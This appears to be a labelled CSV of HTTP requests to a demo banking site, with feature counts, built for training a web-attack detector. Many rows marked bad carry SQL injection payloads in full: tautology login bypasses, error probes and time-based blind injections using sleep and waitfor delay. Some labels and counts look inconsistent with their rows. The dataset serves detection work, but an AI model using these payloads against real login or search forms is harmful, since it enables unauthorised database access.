method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
POST,/sendFeedback,submit=%20Submit%20&cfile=0'XOR(if(now()=sysdate()%2Csleep(14)%2C0))XOR'Z&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,2,0,0,5,2,1,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/index.jsp?content=-1%20OR%202%2B893-893-1=0%2B0%2B0%2B1&job=ExecutiveAssistant:Administration,,0,0,0,0,2,0,bad
GET,/doLogin,,0,0,0,0,0,0,good
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/index.jsp?content=-1%20OR%202%2B116-116-1=0%2B0%2B0%2B1%20--%20&job=ExecutiveAssistant:Administration,,0,0,1,0,4,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,good
POST,/doSubscribe,,1,1,0,0,0,0,bad
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
POST,/sendFeedback,,2,2,0,15,2,9,bad
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/index.jsp?content=-1%20OR%202%2B851-851-1=0%2B0%2B0%2B1&job=OperationalRiskManager:RiskManagement,,0,0,0,0,2,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203%2B23-23-1=0%2B0%2B0%2B1%20or%20'pfTIODsN'='&uid=e,4,0,0,0,4,1,bad
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
POST,/sendFeedback,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=jpPs6VxA',1,0,1,1,5,2,bad
GET,/doLogin,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
POST,/sendFeedback,submit=%20Submit%20&cfile=comments.txt&comments=-1),2,0,1,0,7,2,bad
GET,/doLogin,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
POST,/doSubscribe,OD1e8y0s&txtEmail=sample%40email.tst,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
POST,/doLogin,,2,2,0,15,0,10,bad
POST,/sendFeedback,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=VgxOFwke')),1,0,1,1,5,2,bad
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
POST,/sendFeedback,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2>(0%2B5%2B449-449)%20--%20&name=zFPWdwPk&subject=1,0,0,1,1,6,0,bad
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
POST,/sendFeedback,,2,2,0,0,2,0,bad
GET,/doLogin,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
POST,/sendFeedback,submit=%20Submit%20&cfile=-1'%20OR%202%2B789-789-1=0%2B0%2B0%2B1%20or%20'nxS1wsrE'='&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,4,0,0,0,6,0,bad
POST,/sendFeedback,submit=%20Submit%20&cfile=comments.txt&comments=JyI=&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,0,0,0,0,2,0,bad
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
POST,/sendFeedback,submit=%20Submit%20&cfile=comments.txt&comments=zsZTIAdV',3,0,1,0,7,2,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,,,2,2,0,15,0,9,bad
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/index.jsp?content=HVB81H4n&job=CustomerServiceRepresentative:CustomerService,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/index.jsp?content=inside_jobs.htm&job=LoyaltyMarketingProgramManager:Marketing,,0,0,0,0,0,0,good
POST,/sendFeedback,submit=%20Submit%20&cfile=comments.txt&comments=eOWBMH9z')),1,0,1,1,5,2,bad
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
POST,/sendFeedback,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=LmyCEUWn'),1,0,1,1,5,2,bad
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,,,0,4,0,0,4,0,bad
POST,/doSubscribe,JyI=&txtEmail=sample%40email.tst,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
POST,/doLogin,btnSubmit=Login&passw=%40%40vyfTn&uid=e,0,0,0,0,0,1,bad
GET,/doLogin,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
POST,/sendFeedback,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1'%20OR%202%2B466-466-1=0%2B0%2B0%2B1%20--%20&subject=1,1,0,1,0,6,0,bad
POST,/doLogin,,0,2,0,5,0,2,bad
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=%5C,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/favicon.ico,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,,,2,2,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,good
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=1%00%C0%A7%C0%A2%252527%252522,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
POST,/sendFeedback,,0,2,0,5,0,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2>(0%2B5%2B914-914)%20or%20'QmbTa8Nm'='&uid=1,4,0,0,1,4,1,bad
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/disclaimer.htm?url=http://www.netscape.com,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
POST,/sendFeedback,submit=%20Submit%20&cfile=-1%20OR%202%2B41-41-1=0%2B0%2B0%2B1%20--%20&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,0,0,1,0,6,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
POST,/doSubscribe,-1%20OR%202%2B121-121-1=0%2B0%2B0%2B1%20--%20&txtEmail=sample%40email.tst,0,0,1,0,4,0,bad
GET,,,2,2,0,15,0,9,bad
GET,,,0,2,0,5,0,1,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp?HostName=AltoroMutual,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
POST,/doLogin,cKw45Zw1'),1,0,1,1,3,3,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/Documents/,,0,0,0,0,0,0,good
GET,/index.jsp?content=%5C&job=MortgageLendingAccountExecutive:Sales,,0,0,0,0,0,0,good
POST,/doLogin,,2,2,0,0,0,1,bad
GET,/index.jsp?content=pr/20061109.htm,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
POST,/sendFeedback,submit=%20Submit%20&cfile=%5C&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,0,0,0,0,2,0,bad
GET,/doLogin,,0,0,0,0,0,0,good
POST,/sendFeedback,,2,2,0,0,2,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2>(0%2B5%2B623-623)%20or%20'bkqL7jUZ'='&uid=e,4,0,0,1,4,1,bad
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/search.jsp?query=777',,1,0,0,0,0,0,bad
GET,/index.jsp?content=personal_loans.htm,,0,0,0,0,0,0,good
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*1=6%20AND%20914=914%20or%20'QmbTa8Nm'='&uid=1,4,0,0,0,6,1,bad
POST,/doLogin,-1%20OR%202%2B535-535-1=0%2B0%2B0%2B1&passw=g00dPa%24%24w0rD&uid=e,0,0,0,0,2,1,bad
GET,/index.jsp?content=D2XeIOYH')),,1,0,1,1,3,2,bad
POST,/doLogin,,1,1,0,0,0,1,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/index.jsp?content=0'XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR'Z&job=CustomerServiceRepresentative:CustomerService,,2,0,0,5,0,1,bad
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp?sec=0'XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR'Z&template=US,,2,0,0,5,0,1,bad
GET,/default.jsp?content=88',,1,0,0,0,0,0,bad
GET,/Privacypolicy.jsp?sec=Careers&template=-1'%20OR%202%2B874-874-1=0%2B0%2B0%2B1%20or%20'27lwzvrb'=',,4,0,0,0,4,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2<(0%2B5%2B27-27)%20or%20'kQWwwMxI'='&uid=1,4,0,0,1,4,1,bad
GET,/doLogin,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/index.jsp?content=inside_jobs.htm&job=0'XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR'Z,,2,0,0,5,0,1,bad
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/index.jsp?content=inside_community.htm,,0,0,0,0,0,0,good
GET,/swagger/index.html,,0,0,0,0,0,0,good
GET,,,1,1,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
POST,/sendFeedback,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,0,0,0,0,2,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
POST,/sendFeedback,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%5C&subject=1,0,0,0,0,2,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1%20waitfor%20delay%20'0:0:3'%20--%20,2,0,1,0,5,3,bad
GET,/Privacypolicy.jsp?sec=Careers&template=kumvsGUU')),,1,0,1,1,3,2,bad
GET,,,1,1,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,good
POST,/sendFeedback,,0,2,0,5,2,1,bad
GET,/doLogin,,0,0,0,0,0,0,good
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=JkHPsdvW')),1,0,1,1,3,3,bad
GET,/default.jsp,,0,0,0,0,0,0,good
GET,,,1,1,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
POST,/sendFeedback,,0,2,0,5,2,1,bad
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/index.jsp?content=business_lending.htm,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/index.jsp?content=inside_jobs.htm&job=1%00%C0%A7%C0%A2%252527%252522,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/search.jsp?query=-1%20OR%203*2<(0%2B5%2B785-785)%20--%20,,0,0,1,1,4,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/index.jsp?content=9NCXSvRl',,1,0,1,1,3,2,bad
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/index.jsp?content=-1%20OR%202%2B117-117-1=0%2B0%2B0%2B1&job=CustomerServiceRepresentative:CustomerService,,0,0,0,0,2,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2=6%20AND%2023=23%20or%20'pfTIODsN'='&uid=e,4,0,0,0,6,1,bad
POST,/doLogin,iEKqzxEd')),1,0,1,1,3,3,bad
GET,/sitemap.xml,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/index.jsp?content=business_other.htm,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
POST,/doSubscribe,,0,2,0,5,0,1,bad
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/swagger,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/index.jsp?content=-1%20OR%203%2B117-117-1=0%2B0%2B0%2B1&job=CustomerServiceRepresentative:CustomerService,,0,0,0,0,2,0,bad
GET,/doLogin,,0,0,0,0,0,0,good
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%20000623=000623%20AND%203%2B1-1-1=1%20or%20'bkqL7jUZ'='&uid=e,4,0,0,0,6,1,bad
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/disclaimer.htm?url=KKpZBcqT',,3,0,1,0,5,2,bad
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
POST,/sendFeedback,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=%5C&name=zFPWdwPk&subject=1,0,0,0,0,2,0,bad
GET,/Documents,,0,0,0,0,0,0,good
GET,,,1,1,0,0,0,0,bad
GET,/index.jsp?content=inside_jobs.htm'%20AND%202*3*8=6*8%20AND%20'Nbux'='Nbux&job=LoyaltyMarketingProgramManager:Marketing,,4,0,0,0,4,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
POST,/sendFeedback,-1'%20OR%202%2B262-262-1=0%2B0%2B0%2B1%20--%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,1,0,1,0,4,0,bad
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/default.jsp?content=-1%20OR%202%2B833-833-1=0%2B0%2B0%2B1,,0,0,0,0,2,0,bad
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp?sec=-1%20OR%202%2B282-282-1=0%2B0%2B0%2B1%20--%20&template=US,,0,0,1,0,4,0,bad
GET,/index.jsp?content=1%20waitfor%20delay%20'0:0:21'%20--%20&job=MortgageLendingAccountExecutive:Sales,,2,0,1,0,5,2,bad
GET,/disclaimer.htm,,0,0,0,0,0,0,good
POST,/doLogin,,1,1,0,0,0,1,bad
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/index.jsp?content=Jy8jzPos')),,1,0,1,1,3,2,bad
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*1=6%20AND%20000623=000623%20or%20'bkqL7jUZ'='&uid=e,4,0,0,0,6,1,bad
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/index.jsp?content=mMwlMm5G')),,1,0,1,1,3,2,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/index.jsp?content=inside_jobs.htm&job=-1'%20OR%202%2B772-772-1=0%2B0%2B0%2B1%20or%20'DJgIcJMc'=',,4,0,0,0,4,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/%9A%95%F7i%BA%EC4%01%FE%01%94%AE%85^,,0,0,0,0,0,0,good
POST,/sendFeedback,,1,1,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/search.jsp?query=JyI=,,0,0,0,0,0,0,good
POST,/doSubscribe,if(now()=sysdate()%2Csleep(3)%2C0)&txtEmail=sample%40email.tst,0,0,0,4,0,1,bad
GET,/index.jsp?content=inside_jobs.htm&job=PVHmkMtj'),,1,0,1,1,3,2,bad
GET,,,0,1,1,0,4,0,bad
GET,/index.jsp?content=1%20waitfor%20delay%20'0:0:9'%20--%20&job=CustomerServiceRepresentative:CustomerService,,2,0,1,0,5,2,bad
GET,/index.jsp?content=-1%20OR%202%2B407-407-1=0%2B0%2B0%2B1%20--%20&job=LoyaltyMarketingProgramManager:Marketing,,0,0,1,0,4,0,bad
GET,/index.jsp?content=inside_investor.htm,,0,0,0,0,0,0,good
POST,/sendFeedback,,0,1,1,0,6,0,bad
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
POST,/sendFeedback,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=8JNA6fax')),1,0,1,1,5,2,bad
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
POST,/sendFeedback,submit=%20Submit%20&cfile=JM4QL4su',3,0,1,0,7,2,bad
